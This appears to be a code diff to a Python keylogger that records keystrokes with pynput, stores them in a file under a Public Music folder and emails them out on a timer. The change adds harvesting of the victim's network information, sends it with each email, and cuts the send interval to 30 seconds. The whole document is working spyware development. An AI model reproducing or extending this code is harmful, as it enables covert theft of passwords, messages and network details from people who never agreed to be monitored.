@@ -2,16 +2,17 @@ import pynput.keyboard
 import os as sistema
 import sys
 import correo
+import info
 from threading import Timer
 
 
-EMAIL_DELAY = 30.0 * 15
+EMAIL_DELAY = 30.0
 PATH_TO_FILE ="C:/Users/Public/Music/tmp.txt"
 
 
-def send_email():
-    correo.send()
-    timer = Timer(EMAIL_DELAY,send_email)
+def send_email(net_info):
+    correo.send(net_info)
+    timer = Timer(EMAIL_DELAY,send_email,args=[net_info])
     timer.daemon = True
     timer.start()
 
@@ -83,9 +84,9 @@ def erasecharac(key):
     else:
         return key   
 
-
+user_info = info.get_net_info()
 sys.stdout = attach_stdout()
-timer = Timer(EMAIL_DELAY,send_email)
+timer = Timer(EMAIL_DELAY,send_email,args=[user_info])
 timer.daemon = True
 timer.start()
 listener = pynput.keyboard.Listener(on_release=capturar)
